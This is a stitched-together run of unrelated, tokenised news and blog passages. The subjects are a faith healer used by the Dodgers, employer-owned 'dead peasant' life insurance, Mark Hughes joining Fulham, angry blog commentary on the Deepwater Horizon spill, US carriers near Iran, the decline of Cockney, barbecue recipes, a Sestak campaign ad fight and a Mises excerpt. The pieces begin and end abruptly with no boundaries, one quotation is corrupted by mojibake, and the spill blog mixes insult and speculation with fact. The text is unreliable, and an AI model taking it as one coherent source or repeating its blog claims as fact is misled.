In 2005 , Jamie referred outfielder Jayson Werth to him for treatment of a wrist injury , after Werth had told her of his interest in alternative medicine , according to Cohen and representatives for Frank and Jamie .
Werth had one in - person healing session and one distance healing session , apparently not successful .
In 2008 , as he emerged as a star with the Philadelphia Phillies , Werth said Dodgers doctors had misdiagnosed the injury and that he did not get proper treatment until he went to the Mayo Clinic on his own .
He made no mention of Shpunt .
More recently , Werth appeared startled when asked whether he had worked with a healer named Vladimir while with the Dodgers .
“ Where ’d you hear about that ? ”
Werth said .
He declined to talk about it .

On Oct. 2 , 2004 , Steve Finley capped the first season of McCourt ownership by hitting a walk - off grand slam , clinching the Dodgers ’ first playoff spot in eight years .
“ The miracle finish … was the result of V energy , ” Cohen wrote in an e-mail to Jamie .
“ Frank was privileged to actually feel the energy . ”
Cohen sent that e-mail during the final week of the 2005 season to reinforce Shpunt ’s value to the team .
The Dodgers lost 91 games that season , their worst in 13 years .
“ V believes without his help this team would have lost about 15 more games , ” Cohen wrote , adding : “ It would be a giant error to take V off team . ”
Cohen also wrote that Shpunt had “ diagnosed the disconnects ” among Manager Jim Tracy , General Manager Paul DePodesta and the team ’s pitchers and catchers .
“ Your general manager destroyed last year ’s team , ” the e-mail read , “ and put together a group of players that could not be a team and could not win . ”
Cohen further conveyed Shpunt ’s critical assessments of outfielders Milton Bradley and J.D. Drew and said Shpunt had identified Tracy as the “ final reason for failure . ”
Grossman said Shpunt had been “ introduced to the Dodger organization as someone who had the ability to observe the team , observe opposing teams and provide evaluations of performance of areas and strength and weakness . ”
McCourt fired DePodesta after the season , three weeks after publicly backing him when Tracy and the Dodgers parted ways .
Grossman said Shpunt ’s evaluations did not persuade McCourt to fire DePodesta or to cut ties with Tracy or any player .
“ I doubt that one or more decisions were based just on what he had to say , ” Grossman said .
“ I ’m confident what he had to say was put into the mix of opinions . ”
The relationship between Shpunt and the Dodgers lasted through the ’08 season , after which Jamie asked him for help with matters separate from the team , Cohen said .
That would have required Shpunt to move to Los Angeles , and he declined , Cohen said .
Cohen would not say what kind of work Jamie had asked Shpunt to do , and Jamie would neither confirm nor deny she had asked for his assistance .
By then , Shpunt thought his results with the Dodgers had been so successful that he started to work with amateur and professional athletes , sometimes with hands - on treatment , sometimes trying to will them to victory from a distance .
Would he say which athletes ?
He said he would , well , think about it .

How would you feel if , in the event of your death , your employer got a payout ?
Michael Moore ’s new documentary showcases an extraordinary workplace practice – but is it ethical ?
Does it happen here ?
asks FIONA REDDAN
DO YOU have a life assurance policy ?
No ?
Are you sure ?
Maybe you have one that you do n’t know about , but it ’s not your family that will reap the rewards in the event of your demise – no , it ’s your employer .
It ’s something that may come as a surprise to many but , if practices outlined in Michael Moore ’s new documentary are as widespread as believed , you may in fact be more valuable to your employer dead than alive .
Moore , the enfant terrible of US cinema , has chosen Wall Street as the target of his new documentary , Capitalism : A Love Story .
While his effort may already have been widely panned in the US , one distasteful practice it has brought to light is the use of so - called “ dead peasant ” insurance , whereby large corporations insure the lives of their employees and when they die , the companies gets a handsome payout .
The practice has been around for some time .
Last February , the Wall Street Journalreported on a case where the widow of a former employee of Texas - based Amegy bank , Daniel Johnson , was suing the company to recover $ 1.6 million ( € 1.17 million ) in death benefits which the bank received after her husband died in 2008 .
Mrs Johnson discovered the existence of the insurance policy when a cheque for the full sum was sent to her – instead of the bank – by accident .
But what exactly is “ dead peasant ” insurance ?
Is it legal , and is it happening here ?
Firstly , it ’s important to distinguish the practice from straightforward corporate life assurance policies such as “ key person insurance ” , or corporate - owned life insurance ( Coli ) , as it is known in the US , which is a commonly used tool taken out to protect a firm in the event of the death of a top executive .
Given the important role such a person might play in the firm , and the possibility that the viability of the company might be damaged if such a key person is injured or dies , this type of insurance offers some financial protection for a firm .
Moreover , in these cases , the individual whose life was being insured would be aware that the policy was being taken out and would have to sign proposal forms .
On the other hand , one type of Coli , the so - called “ dead peasant ” or “ dead janitor ” insurance , is frequently used to take out life insurance on employees much further down the corporate ladder .
In such cases the employer owns each policy , pays the premiums , and is the beneficiary named to receive the proceeds of the policy on an employee ’s death .
More sinister is the fact that the employee is often unaware of the existence of the policy .
Michael Myers of Houston law firm McClanahan , Myers and Espey , who appears in Moore ’s movie , began representing the families of employees whose lives were covered by Coli in 1995 , and has been involved in several high - profile class action cases , including Wal - Mart .
He says the term “ janitor ” is used because the insurance sometimes extends to employees as far as that level .
While he asserts that “ generally , you ca n’t buy insurance on a person ’s life unless they sign something agreeing to it ” , and that doing so is illegal in almost every state in the US , nonetheless “ laws are violated frequently ” .
As the policy runs until employees die , and death often takes place some time after a person has left a company , firms routinely check social security numbers to determine when someone dies in order to submit a claim .
Myers estimates that “ several million people ” are covered by such policies in the US , and the amounts for which they are insured vary quite substantially from employer to employer , but he has seen policies ranging from € 50,000 to several million .
Why do they do it ?
As Myers says , “ to make money ” .
The lump - sum earned by the company when an employee dies is tax free , while tax is also deferred on the investment , and the cover is used by many companies as a tax shelter .
Corporates defend using the technique on the grounds that employees generate significant costs over the term of their employment , particularly in the US , where health insurance is particularly expensive .
Availing of such insurance , therefore , either with or without an employee ’s consent , is simply a means of defraying the cost of providing such benefits , and it is commonly used to finance an employer ’s obligation under a retiree health benefit plan .
Moreover , firms can also borrow against the policy to fund benefits .
According to Myers , however , this explanation is a “ nice , tidy rationalisation ” and is “ just not true ” .
“ I ’ve never , ever seen a situation where a company deposits funds into a separate account for this purpose .
It goes straight into the general treasury , where it is co-mingled with the company ’s other revenues , ” he says .
Given the controversy the use of such life assurance products has generated in the past , the US authorities have tried to crack down on how they are used .
For example , some states now prohibit policies which cover rank and file employees , so - called “ dead peasant ” insurance , while others require that companies either notify employees or that employees specifically consent to the Coli purchase .
However , given that the new rules are n’t retroactive , the practice continues for policies taken out before the changes .
Such insurance obviously raises some very deep ethical issues .
After all , there must be something wrong with your employer having an interest in your death .
“ A primary concern is that , as employers are generally responsible for workplace safety , it is an ethical issue for an employer to have a financial interest in the early death of an employee , ” says Myers .
Dr Eleanor O’Higgins , a lecturer in business ethics at UCD , says the practice is totally at odds with respecting another person as a fellow human being .
“ If a company takes out life insurance on its employee , without that person ’s agreement , it shows total disrespect to that other person .
It ’s the ultimate treatment of a person as a resource , not as a fellow human being , ” she says .
“ It ’s like the survival of the fittest ; it shows a lack of moral and social responsibility . ”
But before you start thinking that your employer wants you dead , you should know that the practice appears to be largely confined to the US .
“ I ’ve never seen anything that suggests to me that it goes on outside the US , ” says Myers , although O’Higgins adds that , given how Ireland has adopted the Anglo - American form of capitalism , “ it could happen here ” .
According to a spokeswoman for Bank of Ireland Life , one of the largest players in the provision of corporate life assurance products in Ireland , the bancassurer does not offer any such products in the Irish marketplace .
Instead , it provides a variety of other products , including personal and corporate shareholder protection , partnership insurance , and key - person insurance – aimed at protecting businesses .
In the case of disability , illness or death of a key employee or executive , a corporate does receive a payout if it has taken out one of the aforementioned insurance policies .
This is used to ensure the future viability of the business – and the person whose life is being insured is fully aware that this is the case .
• Failure to capture Martin Jol forced the club to look elsewhere •
New manager expected to be backed in the transfer market
Mark Hughes has accepted an offer from Fulham to become the club 's new manager .
The Welshman will succeed Roy Hodgson , who left in the summer to join Liverpool , and his appointment has disappointed Sven - Goran Eriksson , who had been under consideration .
Mohamed Al Fayed , the Fulham chairman , had turned to Hughes after the failure to prise Martin Jol from his contract at Ajax last week .
But Hughes 's capture represents a coup for the west London club , who have made startling progress in the past two seasons .
Hughes came to the fore after the impasse with Jol and it quickly became apparent that Fayed could satisfy his financial wishes , on both his contract and the budget for signings .
Fayed is determined to make an impact on the summer transfer market and he also has a history of backing his managers with funds .
Hughes faced a dilemma over whether to uproot from north - west England , where his family are settled , but his fierce ambition , which he believes can be sated at Craven Cottage , held sway .
He is expected to bring with him his long - time assistant coaches Mark Bowen and Eddie Niedzwiecki , and the goalkeeping coach Kevin Hitchcock .
By recruiting Hughes , Fulham put an end to the sense of uncertainty around the club , which Fayed was conscious might have become damaging had it endured until the eve of the season , and they can begin pressing ahead with their transfer plans .
They have an agreement in place with Aston Villa over the purchase of the midfielder Steve Sidwell , to which Hughes must give his consent , while they also have an interest in the England goalkeeper David James , who has left Portsmouth .
If , as expected , Arsenal make an improved offer for Fulham 's No1 Mark Schwarzer – Arsène Wenger has had a £ 2 m bid rejected – and Fayed 's club sanction the sale , they would then move for James , with Hughes 's blessing , believing that Craven Cottage has been James 's preferred destination all along .
Hughes 's appointment will come as a relief to the Fulham squad , some of whom had started to assess their options following Hodgson 's departure .
They have just returned from a short tour of Sweden , under the caretaker charge of Ray Lewington , and the situation was becoming unsettling .
There is a little over two weeks before they begin their Premier League season , away to Bolton Wanderers .
Hughes 's managerial career began with a five - year stint in charge of Wales , whom he almost took to the Euro 2004 finals ; only a play - off defeat by Russia , by a single goal over the two legs , denied him .
He then spent four impressive seasons at Blackburn Rovers , leading them to three domestic cup semi-finals and establishing them in the top half of the Premier League .
His best finish was sixth in 2005 ‑06 , a result that enabled Rovers to qualify for the Uefa Cup .
He left Ewood Park for Manchester City in the summer of 2008 and weeks into his reign the club were taken over by the Abu Dhabi United Group and catapulted into a different financial league , which brought its own pressures .
Hughes 's side finished 10th that season and also made the Uefa Cup quarter - finals , but he was sacked in December of last year .
Many believe he was harshly treated .
Hughes succeeded Eriksson at City and the Swede has again been usurped by him .
The Swede 's candidacy had been pushed by the club 's chief executive , Alistair Mackintosh , with whom he had worked well at City , but Fayed makes the final decisions for Fulham .
Mackintosh had a more difficult relationship with Hughes at Eastlands .
Eriksson has the offer of another contract with Ivory Coast on the table while Fulham also had the Switzerland manager , Ottmar Hitzfeld , on their shortlist .
We have discussed the use of a nuclear device to kill the oil spill and I for my part have decided that ’s too crazy to be considered .
The cap is said to work , but I seriously doubt it .
Remember when they cut the riser to put on the cap , the oil spill actually increased by some 20 % .
Some say the increase could be even 80 % .
As always , I ca n’t tell and I fear nobody really can and if they can , they wo n’t tell us .
When they now claim they are funneling oil from the spill into a ship , is it really more than what the cutting of the riser caused in the first place ?
Are we really better off or only marginally so or even worse off now ?
This question remains unanswered .
I think what is obvious is :
Oil continues to spill into the Gulf of Mexico which is already reeling from what has been already issued into the ecosystem since the Deepwater Horizon exploded .
We need to consider what is going to happen to the crude oil once it ’s out of it ’s lair .
Nature will take care of it .
That ’s actually true .
There are microorganisms out there which live off crude oil :
some individual species ( Pseudomonas ) can use up to 1000 different carbon compounds .
What do they do with the oil ?
Well basically they eat it just like you eat cereal .
They use enzymes to break it up ( metabolize it ) using O2 turning it into CO2 and more microorganisms .
The word here is O2 .
There ’s huge amounts of C ( arbon ) in the oil but not so much O ( xygen ) .
Where are the little buggers getting it from ?
Likely from the surrounding waters and the solute oxygen .
What with the dead zones that are already there and getting worse in warmer temperatures , incidentally the temperatures where Pseudomonas gets really hungry , this is not really encouraging .
Some kinds are even causing severe skin infections .
Nevertheless it ’s worth to take a closer look .
Because these microbes exist and they seem to even develop where there is an oil spill :
A recently published article in Environmental Microbiology reveals that indigenous microbiota of the Galician shore is readily able to degrade crude oil .
Scientists from the Estación Experimental del Zaidín ( Spanish Council for Research , CSIC ) in Granada investigated in situ crude oil degradation after the Prestige oil spill in November 2002 . ( read more )
How about introducing oil eating microbes into the Gulf , the environment is favourable , the Gulf waters are warm enough for them to thrive .
HAVANA , Aug. 31 , 2005 ( IPS / GIN ) —
Scientists think a product used in Cuba since 1992 to clean up oil spills with marine bacteria could prove useful for other warm - weather countries .
Bioil - FC has proven effective in changing the toxic compounds in hydrocarbons into biodegradable substances , turning them back into carbon dioxide and water .
This inexpensive “ bioproduct ” also compares favorably against other products used to clean up hydrocarbon spills , Cuban scientists say .
“ We have achieved more than 90 percent remediation ( clean up ) in a maximum of 30 days of application , ” chemical engineer Roberto Nunez , director of CEBIMAR , a marine biological research center , told Tierramerica .
Expert sources from various countries consider a satisfactory biological clean - up for spills of petroleum and its derivatives to be 55 percent in three to four months .
“ Bioremediation ” is a technique for environmental detoxification through microorganisms that break down dangerous organic waste and turn it into less harmful compounds .
This method , available for the past 25 years , exploits the ability of some bacteria , yeast or molds to incorporate part of the dangerous compounds into their metabolism , for growth or for energy of the organism itself .

I have already voiced my concerns about the dead zones and the effect more oxygen depletion could have , but this is a natural process and if the oxygen depletes too much , the microbae would die and stop using more oxygen .
I do n’t advocate miracle cures , there are too many out there who do so .
I do n’t believe in miracles anyway .
But I believe in the strength of nature and I think it can be put to good use .
It ’s cheap , it certainly less toxic than Dispersit or Corexit and the microbes , like any population will die off and reduce in numbers when they ’re running out of food .
These microbes already exist and are not genetically engineered for the purpose .
So why do n’t we hear much more of this ?
Not manufactured ?
Not engineered ?
No money to be made !

Using Hazmat Dry -Diving Suits Champion and Cousteau documented the flecks of oil which are gradually sinking into the water column about 20 miles off the coast of Louisiana .
These are huge greasy oil , diesel and gasoline - like toxic plumes which can burn the skin and easily be absorbed into the gills and skin of marine life , including shrimp , dolphins , oysters , kelp and other elements of the food chain .
How you like your Tuna served ?
Regular or Unleaded ?

This is the worse thing I 've ever seen underwater in my life .
It 's a Nightmare
Even though Good Morning America is a National Show , and even though this footage is fairly explosive we still continue to listen to wan platitudes from BP and the Administration that they 're '
" Doing all they can ... " and " the impact will be fairly mild " , yet this footage makes it clear this might causes damage that will spread through the eco-system quite easily for decades .
And it 's not like BP and the government have been helpful at helping recognize and identify the amount of damage taking place as one CBS crew discovered as they were threatened by arrest by the Coast Guard while exploring public waters off the coast of Louisiana .
Watch CBS News Videos Online
Emerging reports are raising the question of just how much of the Gulf of Mexico oil spill journalists are able to document .
When CBS tried to film a beach with heavy oil on the shore in South Pass , Louisiana , a boat of BP contractors , and two Coast Guard officers , told them to turn around , or be arrested .
" This is BP 's rules , it 's not ours , " someone aboard the boat said .
Coast Guard officials told CBS that they 're looking into it .
So the U.S. Coast Guard is now a wholely owned subsidiary of BP ?
Exactly when did that happen ?
How is it that BP gets to defy the EPA when they request a less toxic alternative to Corexit 9500 , particularly when a former BP Exec and Board member for 45 years is the current head of Nalco ( Hm , Incest is Best ? ) , the company that provides Corexit 9500 , which in turn is owned by in part by that bastion of corporate compassion - Goldman Sachs ?
So far Nalco has sold $ 40 Million worth of Corexit to BP .
Not to be all Beckian about it but , Coincidence ?
I think not .
Similarly stocks for Transocean , the Offshore Oil Drilling company that is headquartered in a the completely landlocked country of Sweden Switzerland for tax purposes , has issued a $ 1 Billion bonus to it 's Stock - holders after the Deep Horizon Catastrophe , and even been awarded over $ 200 Million in insurance benefits from the loss of the oil rig .
Talk about selling short and cleaning up while making a huge fracking mess , they 've made a profit from this .
Meanwhile as they make $ Billions BP is still too chincy and cheap to provide adequate protection to Fishermen who 've they hired to help clean up the spill .
Like other cleanup workers , Jackson had attended a training class where he was told not to pick up oil - related waste .
But he said he was n’t provided with protective equipment and wore leather boots and regular clothes on his boat .
“ They [ BP officials ] told us if we ran into oil , it was n’t supposed to bother us , ” Jackson said .
“ As far as gloves , no , we have n’t been wearing any gloves . ”
Some of those workers , dealing with the toxic stew of oil and Corexit have been suffering from headaches and nausea - and after the long term respiratory problems we 've seen among people who worked the cleanup at ground zero - we should all know better than this by now .
Imagine if that cloud was airborne , and hanging over the states of Louisiana , Mississippi and Alabama like a Plume of Death ?
Now , just remember that the fish do n't have any protection either , and that all that toxicity is n't going to magically disappear , it 's going to work it 's way through the food chain , then be evaporated into the atmosphere and come back down as rainwater - just in time for Hurricane season .
Good Bye Water Table - Hello Cancer Clusters .
I agree with Randi Rhodes , in 10 to 20 years were going to be hearing Larry H. Parker Styled Commercials about Corexit Exposure Settlements , just as we have previously for DDT , Agent Orange , Malathion and Mesothemiola from Asbestos .
Today President Obama is scheduled to take his first press conference in 10 Months and announce a round of sweeping new mining and drilling regulations .
Hopefully among those regulations are a requirement for Relief Wells to be drilled in tandem with the primary exploratory well - as is required by Canada and other countries .
Accidents do happen , but being completely unprepared for one - just to save $ 500,000 in extra drilling coasts - does n't have to .
It also might be nice if corporate employees are n't allowed to fill in their own inspection reports in pencil , only to have them copied over in ink by regulators after the fact , beside y'know doing Chrystal Meth and Boinking the people they 're supposed to be regulating .
Quite a bit of focus has been on the MMS in the past months , but we also should hope to have the issue of burrowed in Bush Moles who philosophically object to the mission of the department .
Moles such as Climat - Change denier Liberterian Cato Instititue Fellow , and American Enterprise Institute member Indur Goklany who still retains a high position in the Interior Dept despite Bush 's Presidency being over for over 2 years .
Admittedly it 's easy to point fingers , and like Limbaugh or Brownie who - without any evidence - argued that either Greenpeace sabotaged the oil rigged , or the Obama administration has slow walked the response in order to support their " secret true agenda " of derailing offshore drilling , it could be easy to surmise that the Bush Mole 's may still have an influence on the spill response , like a stuck parking brake on a speeding car ...
But in the end we have to admit the the ultimate responsibility for this mess , both above and below the water , falls directly in Obama 's lap .
The argument of the need for government to step in and address personal and corporate malfeasance and Crimes should be over , money - grubbing corporations are NOT going to regulate themselves and a public that as easily distracted by shiny vapid objects such as Teen UnRapper Justin Beiber , Kim Kardashian 's huge bulbous ass and a Skate - boarding dog are not going to bring them to heel , but the question of the governments ability to actually implement correction and justice in the wake of those crimes remains sadly in question .
Obama has to take control of this situation , personally if necessary .
First on the list , whether the " Top Kill " works or not , is the fact that there is no legitimate reason to use ANY dispersant to hide the oil spills actual size and disable the ability to vacuum the oil up from the surface as has been suggested by former head of Shell Oil .
Sure we have to fix the spill , but we also need to clean it up and we can't do that with it hiding under the surface or sinking slowly to the bottom into the ecosphere .
However it turns outs , now is the time for the Obama Administration and President Obama personally to truly show what 's they 're made of , now is the time for him to Step the Frack Up and show the we can still do great things , even though they are incredibly difficult - or else suffer the electoral consequences .
Is this " Obama 's Katrina " ?
Frack
No , but if he does n't get his SHIT together , it could be worse .
Much Worse .
Still praying " Obama Fails " Rush ?
I 'm not .
We can't afford it , none of us can .

Update : Amid all the Doom and Gloom - I 've heard two good things this morning .
So far the " Top Kill " is holding and working according to Adm Thad Allen of the Coast Guard , and the head of the Offshore Drilling Oversight Agency has been fired retired .
WASHINGTON ( AP ) - AP sources : Elizabeth Birnbaum fired as director of the U.S. Minerals Management Service .
How 's that for change ?
Update 2 BP is contesting the Coast Guard report , saying the top kill has n't stopped the leak - yet , but it is " working as planned " .
An independent task force says that this spilled somewhere between 17 - 39 Million Gallons of Oil into the Gulf , and could be as much as 5 Times the size of the Exxon - Valdez .
As unconfirmed reports of an imminent Israeli strike on Iran ’s nuclear facilities pick up steam in the Middle Eastern media , a US - based strategic intelligence company has released a chart showing US naval carriers massing near Iranian waters .
The chart , published by Stratfor and obtained by the Zero Hedge financial blog , shows that over the last few weeks a naval carrier — the USS Harry S Truman — has been positioned in the north Indian Ocean , not far from the Strait of Hormuz , which leads into the Persian Gulf .
The carrier joins the USS Dwight D. Eisenhower , which was already located in the area .
The chart is dated June 23 , 2010 .

Reports of mass movements of Israeli and US naval warships have been circulating through the media for weeks .
On June 19 , the Israeli newspaper Ha’aretz reported that 12 US and Israeli warships were seen moving through the Suez Canal from the Mediterranean Sea to the Red Sea .
And a report from the Associated Press published Saturday evening cited “ unconfirmed ” reports from Israeli and Iranian media that Saudi Arabia has allowed Israel to use its territory in preparation for an attack on Iranian nuclear facilities .
“ The allegation could not be independently confirmed , and the Saudis deny cooperating with the Israeli military , ” AP reported .
An article in the Gulf Daily News , largely dismissed by Western observers , did not mention any Saudi involvement but said Israel is preparing to attack Iranian targets from the former Soviet republics of Azerbaijan and Georgia .
The claims that Israel may be preparing for an assault on Iranian nuclear facilities were strengthened this weekend by Italian Prime Minister Silvio Berlusconi , who told reporters at the G8 summit in Canada that G8 leaders “ believe absolutely ” that Israel will “ probably ” strike Iran .

Ã¢â‚ ¬Å“ Iran is not guaranteeing a peaceful production of nuclear power [ so ] the members of the G8 are worried and believe absolutely that Israel will probably react preemptively , Ã¢â‚ ¬Â Berlusconi said , as quoted at Ha’aretz .
CIA director Leon Panetta said Sunday that Iran has enough enriched uranium to build two nuclear bombs .
In an interview on ABC’s This Week , Panetta also said he believed the recent spate of international and US sanctions against Iran will not convince the country to change course on its nuclear program .
“ Will it deter them from their ambitions with regards to nuclear capability ?
Probably not , ” Panetta said .
Image caption Cockney has been spoken in London for more than 500 years
The Cockney accent will disappear from London 's streets within 30 years , according to new research .
A study by Paul Kerswill , Professor of Sociolinguistics at Lancaster University shows the Cockney accent will move further east .
In London , Cockney will be replaced by Multicultural London English - a mixture of Cockney , Bangladeshi and West Indian accents - the study shows .
" It will be gone within 30 years , " says Prof Kerswill .
' Jafaican '
The study , funded by the Economic and Social Research Council , says the accent , which has been around for more than 500 years , is being replaced in London by a new hybrid language .
The new accent , known in slang terms as Jafaican , is most famously spoken by rap star Dizzee Rascal .
" Cockney in the East End is now transforming itself into Multicultural London English , a new , melting - pot mixture of all those people living here who learnt English as a second language , " Prof Kerswill says .
Traditional Cockneys have moved out of the capital and into the surrounding counties of Essex and Hertfordshire , especially towns such as Romford and Southend , the study suggests .
In these areas , the accent and the culture continues to thrive and many teenagers still proudly claim their Cockney roots , according to the study .
" It has been transplanted to these towns , " says Prof Kerswill .
To mark the change , Kings Place , an arts centre based in central London 's Kings Cross , is asking Londoners to talk to elderly relatives and contribute Cockney poetry and phrases to an archive .
The study , called Multicultural London English : the emergence , acquisition and diffusion of a new variety , is due to be published in early 2011 .

Kick up your grilled foods this summer by adding high - intensity flavors before , during and after grilling .
“ It ’s all about creating layers of flavor , ” said Mike Moran , a barbecue competitor and owner of MoMo BBQ Co .
As grillers become more sophisticated , they are learning it ’s OK to be adventurous .
Mix and match methods — rubs , marinades , injections and barbecue sauces to elevate the flavor of grilled foods .
Take a pork butt .
Marinate it overnight in a sweet citrus sauce , sprinkle it with a spiced rub before it hits the grill and then finish it off with a barbecue sauce .
Same with chicken .
Coat it with spicy rub , grill it and slather on the barbecue sauce .
" You have the contrasting flavors going on .
You have a bunch of different layers of flavoring , " said Moran , who operates a MoMo BBQ stand at Metro Bank Park in Harrisburg .
There are no hard and fast rules .
Experiment to find out what you like .
Moran uses basic recipes and then adjusts the ingredients .
“ That ’s the beautiful thing about cooking .
You take basic recipes and tweak them and make them what you like .
It ’s putting your stamp on it , ” he said .
Basic BBQ Sauce
1 cup ketchup
½ cup brown sugar
3 tablespoon vinegar ( any type of vinegar will work )
2 tablespoon water
1 tablespoon Worcestershire sauce
1 teaspoon salt
½ teaspoon garlic powder
¼ teaspoon onion powder
Combine all ingredients and bring to a boil .
Reduce heat to low for about half hour .
For an Asian twist , exchange the water for pineapple or orange juice and switch out the Worcestershire sauce for soy sauce .
Instead of water , add bourbon for a Kentucky bourbon sauce .
Add rum in place of the water with some orange or pineapple juice for a spiced rum sauce .
Add 1 tablespoon honey or molasses for a sweeter sauce .
Basic BBQ Rub
1 cup brown sugar
½ cup granulated sugar
½ cups seasoned salt
½ cup paprika
¼ cup chili powder
½ cup each garlic salt and onion salt
2 tablespoons black pepper
1 teaspoon cayenne
1 teaspoon dry mustard
1 teaspoon cumin
Combine all ingredients .
For a different twist , add white pepper instead of black pepper .
Adjust the heat by using ancho , chipotle or habanerno chili powders .
Or , add ground up dried orange peel or lemon zest .
War escalates between Joe Sestak and right - wing pro-Israel group
A fascinating story out of Pennsylvania :
The war is escalating big time between Dem Senate candidate Joe Sestak and Bill Kristol 's new pro-Israel group , with the group increasing its ad buy slamming Sestak as soft on Israel and Sestak demanding that cable TV pull the spot on the grounds that it 's a vicious smear .
MIchael Goldfarb , a spokesman for Kristol 's Emergency Committee for Israel , which was modeled on Liz Cheney 's " Keep America Safe , " tells me the group is doubling the size of the buy it plunked down to run this new spot , which asks : " Does Congressman Joe Sestak understand Israel is America 's ally ? "
Separately , I 've obtained a letter that the Sestak campaign has fired off to Comcast , blasting the cable carrier for running a spot that 's " false , misleading and deceptive . "
The crux of the ad's attack on Sestak :
It hits him for signing a letter criticizing Israel 's Gaza blockade , for refusing to sign an AIPAC letter defending Israel , and for " raising money " for a fundraiser for the Council on American Islamic Relations .
The ad describes CAIR as an " anti-Israel organization the FBI called a ' front - group for Hamas , " even though CAIR has repeatedly denied this and no charges were brought against the group .
The Sestak campaign initially blasted the ad and demanded that Comcast refrain from running it .
Sestak 's camp argued that it 's highly misleading to claim he ever raised money for CAIR , because he'd only attended a CAIR event that was free of fundraising , and argued that the ad badly distorted other of Sestak 's Israel - related positions .
But Kristol 's group responded , and it appears Comcast is going to continue to run the ad .
Also , the group 's doubling of the ad buy means it will run on broadcast TV during this Friday 's Phillies game .
Now Sestak is redoubling efforts to get the ad taken down .
In the new letter to Comcast , the Sestak camp basically accuses Comcast of misleading its viewers .
Sestak 's campaign organized a press conference today in Philly where Jewish leaders will denounce the group 's campaign against him .
The Sestak camp faces a familiar dilemma : Should it ignore the Kristol group 's attacks , or should it aggressively rebut them , which risks drawing more media attention to the group 's efforts ?
Sestak is opting for the latter , aggressive approach .
We 'll see where this goes .

[ This article is excerpted from chapter 21 of Human Action , the Scholar 's Edition and is read by Jeff Riggenbach . ]
The life of primitive man was an unceasing struggle against the scantiness of the nature - given means for his sustenance .
In this desperate effort to secure bare survival , many individuals and whole families , tribes , and races succumbed .
Primitive man was always haunted by the specter of death from starvation .
Civilization has freed us from these perils .
Human life is menaced day and night by innumerable dangers ; it can be destroyed at any instant by natural forces which are beyond control or at least cannot be controlled at the present stage of our knowledge and our potentialities .
But the horror of starvation no longer terrifies people living in a capitalist society .
He who is able to work earns much more than is needed for bare sustenance .
There are also , of course , disabled people who are incapable of work .
Then there are invalids who can perform a small quantity of work ; but their disability prevents them from earning as much as normal workers do ; sometimes the wage rates they could earn are so low that they could not maintain themselves .
These people can keep body and soul together only if other people help them .
The next of kin , friends , the charity of benefactors and endowments , and communal poor relief take care of the destitute .
Alms folk do not cooperate in the social process of production ; as far as the provision of the means for the satisfaction of wants is concerned , they do not act ; they live because other people look after them .
The problems of poor relief are problems of the arrangement of consumption , not of the arrangement of production activities .
They are as such beyond the frame of a theory of human action that refers only to the provision of the means required for consumption , not to the way in which these means are consumed .
Catallactic theory deals with the methods adopted for the charitable support of the destitute only as far as they can possibly affect the supply of labor .
It has sometimes happened that the policies applied in poor relief have encouraged unwillingness to work and the idleness of able - bodied adults .
In the capitalist society there prevails a tendency toward a steady increase in the per capita quota of capital invested .
The accumulation of capital soars above the increase in population figures .
Consequently the marginal productivity of labor , wage rates , and the wage earners ' standard of living tend to rise continually .
But this improvement in well - being is not the manifestation of the operation of an inevitable law of human evolution ; it is a tendency resulting from the interplay of forces that can freely produce their effects only under capitalism .
It is possible and , if we take into account the direction of present - day policies , even not unlikely that capital consumption on the one hand and an increase or an insufficient drop in population figures on the other hand will reverse things .
Then it could happen that men will again learn literally what starvation means and that the relation of the quantity of capital goods available and population figures will become so unfavorable as to make part of the workers earn less than a bare subsistence .
The mere approach to such conditions would certainly cause irreconcilable dissensions within society , conflicts the violence of which must result in a complete disintegration of all societal bonds .
The social division of labor cannot be preserved if part of the cooperating members of society are doomed to earn less than a bare subsistence .
The notion of a physiological minimum of subsistence to which the " iron law of wages " refers and which demagogues put forward again and again is of no use for a catallactic theory of the determination of wage rates .
One of the foundations upon which social cooperation rests is the fact that labor performed according to the principle of the division of labor is so much more productive than the efforts of isolated individuals that able - bodied people are not troubled by the fear of starvation that daily threatened their forebears .
Within a capitalist commonwealth the minimum of subsistence plays no catallactic role .
Furthermore , the notion of a physiological minimum of subsistence lacks that precision and scientific rigor that people have ascribed to it .
Primitive man , adjusted to a more animal - like than human existence , could keep himself alive under conditions that are literally unbearable to his dainty scions pampered by capitalism .
There is no such thing as a physiologically and biologically determined minimum of subsistence , valid for every specimen of the zoological species homo sapiens .
No more tenable is the idea that a definite quantity of calories is needed to keep a man healthy and progenitive , and a further definite quantity to replace the energy expended in working .
The appeal to such notions of cattle breeding and the vivisection of guinea pigs does not aid the economist in his endeavors to comprehend the problems of purposive human action .
The " iron law of wages " and the essentially identical Marxian doctrine of the determination of " the value of labor power " by " the working time necessary for its production , consequently also for its reproduction , " are the least tenable of all that has ever been taught in the field of catallactics .
Yet it was possible to attach some meaning to the ideas implied in the iron law of wages .
If one sees in the wage earner merely a chattel and believes that he plays no other role in society , if one assumes that he aims at no other satisfaction then feeding and proliferation and does not know of any employment for his earnings other than the procurement of those animal satisfactions , one may consider the iron law as a theory of the determination of wage rates .
In fact the classical economists , frustrated by their abortive value theory , could not think of any other solution of the problem involved .
For Torrens and Ricardo , the theorem that the natural price of labor is the price that enables the wage earners to subsist and to perpetuate their race without any increase or diminution was the logically inescapable inference from their untenable value theory .
But when their epigones saw that they could no longer satisfy themselves with this manifestly preposterous law , they resorted to a modification of it that was tantamount to a complete abandonment of any attempt to provide an economic explanation of the determination of wage rates .
They tried to preserve the cherished notion of the minimum of subsistence by substituting the concept of a " social " minimum for the concept of a physiological minimum .
They no longer spoke of the minimum required for the necessary subsistence of the laborer and for the preservation of an undiminished supply of labor ; they spoke instead of the minimum required for the preservation of a standard of living sanctified by historical tradition and inherited customs and habits .
While daily experience taught impressively that , under capitalism , real wage rates and the wage earners ' standard of living were steadily rising , while it became from day to day more obvious that the traditional walls separating the various strata of the population could no longer be preserved , because the social improvement in the conditions of the industrial workers demolished the vested ideas of social rank and dignity , these doctrinaires announced that old customs and social convention determine the height of wage rates .
Only people blinded by preconceived prejudices and party bias could resort to such an explanation in an age in which industry supplies the consumption of the masses again and again with new commodities hitherto unknown and makes accessible to the average worker satisfactions of which no king could dream in the past .
It is not especially remarkable that the Prussian Historical School of the wirtschaftliche Staatswissenschaften viewed wage rates no less than commodity prices and interest rates as " historical categories " and that in dealing with wage rates it had recourse to the concept of " income adequate to the individual 's hierarchical station in the social scale of ranks . "
It was the essence of the teachings of this school to deny the existence of economics and to substitute history for it .
But it is amazing that Marx and the Marxians did not recognize that their endorsement of this spurious doctrine entirely disintegrated the body of the so - called Marxian system of economics .
